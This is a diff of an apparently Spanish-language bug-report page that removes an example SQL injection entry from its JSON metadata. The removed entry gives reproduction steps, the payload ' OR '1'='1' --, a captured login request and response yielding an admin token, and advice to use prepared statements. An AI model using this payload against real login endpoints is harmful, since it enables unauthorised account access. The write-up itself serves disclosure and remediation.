@@ -34,33 +34,6 @@
 
 <script id="bug-meta-data" type="application/json">
 {
-  "example-bug": {
-    "steps": [
-      "Abrir el formulario de login en /login",
-      "En el campo username introducir el payload: ' OR '1'='1' --",
-      "Dejar el campo password en blanco y enviar la petición",
-      "Observar que el servidor devuelve HTTP 200 OK con un token JWT válido sin credenciales correctas"
-    ],
-    "poc": "# Request HTTP capturado con Burp Suite\nPOST /api/v1/auth/login HTTP/1.1\nHost: [REDACTED]\nContent-Type: application/json\n\n{\"username\": \"' OR '1'='1' -- -\", \"password\": \"\"}\n\n# Response — login exitoso sin credenciales válidas\nHTTP/1.1 200 OK\n{\"token\": \"eyJhbGci...\", \"user\": {\"id\":1,\"role\":\"admin\"}}",
-    "recommendation": "Usar consultas preparadas (Prepared Statements) o un ORM en todas las interacciones con la base de datos. Nunca construir queries concatenando input del usuario. Añadir rate-limiting y bloqueo por intentos fallidos en el endpoint de login.",
-    "timeline": {
-      "reported": "2025-03-10",
-      "triaged": "2025-03-11",
-      "resolved": "2025-03-14"
-    },
-    "environment": "Node.js + MySQL 8.0 — API REST en producción",
-    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
-    "references": [
-      {
-        "label": "OWASP — SQL Injection",
-        "url": "https://owasp.org/www-community/attacks/SQL_Injection"
-      },
-      {
-        "label": "CWE-89",
-        "url": "https://cwe.mitre.org/data/definitions/89.html"
-      }
-    ]
-  },
   "race-condition-multiple-purchase": {
     "steps": [
       "Autenticarse en la plataforma con una cuenta que tenga saldo suficiente para comprar exactamente un artículo de bajo valor.",
